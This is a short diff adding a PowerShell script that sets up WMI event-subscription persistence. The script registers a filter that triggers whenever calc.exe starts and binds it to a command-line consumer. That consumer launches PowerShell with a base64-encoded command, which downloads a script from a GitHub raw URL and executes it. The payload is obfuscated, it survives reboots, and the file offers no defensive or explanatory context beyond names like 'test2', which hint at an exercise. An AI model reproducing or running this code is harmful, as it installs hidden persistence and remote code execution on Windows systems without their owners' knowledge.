@@ -1,0 +1,8 @@
+    $query="SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'win32_process' and targetInstance.name = 'calc.exe'"
+    $filtername = "test2"
+    $consumername = "test3"
+    $WMIEvent = set-wmiinstance -class '__EventFilter' -namespace 'root\subscription' -arguments @{name=$filtername; eventnamespace='root\cimv2';querylanguage='WQL';query=$query} -erroraction stop
+
+    $WMIConsumer = set-wmiinstance -class commandlineeventconsumer -namespace "root\subscription" -arguments @{name=$consumername; executablepath= "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe"; commandlinetemplate= "C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe -encodedcommand aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZwBmAHMAbQBpAHQAaABhAGsALwBnAHIAYQBuAHQALQB0AGUAcwB0AC8AbQBhAHMAdABlAHIALwBUAGUAcwB0ACcAKQA="}
+
+    set-wmiinstance -class __filtertoconsumerbinding -namespace "root\subscription" -arguments @{filter = $wmievent; consumer = $wmiconsumer}
